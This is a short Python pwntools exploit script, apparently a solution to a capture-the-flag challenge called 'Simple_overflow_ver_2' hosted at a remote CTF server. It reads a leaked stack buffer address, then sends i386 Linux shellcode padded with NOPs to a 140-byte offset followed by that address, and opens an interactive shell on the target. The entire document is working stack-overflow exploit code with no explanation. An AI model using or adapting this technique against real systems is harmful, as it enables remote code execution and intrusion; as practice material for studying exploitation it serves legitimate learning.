from pwn import *

#context.log_level = 'DEBUG'
context.arch = 'i386'
e = ELF("./Simple_overflow_ver_2")
#p = process("./Simple_overflow_ver_2")
r = remote("ctf.j0n9hyun.xyz", 3006)
offset = 140
print r.recvuntil("Data : ")
r.sendline("AAAA")
buffer = int(r.recv(10), 16)
print hex(buffer)
print r.recvuntil("Again (y/n): ")
r.sendline("y")
print r.recvuntil("Data : ")


shell = shellcraft.i386.linux.sh()

payload = ''
payload += asm(shell)
payload += "\x90"*(offset - len(asm(shell)))
payload += p32(buffer)

r.sendline(payload)
r.interactive()
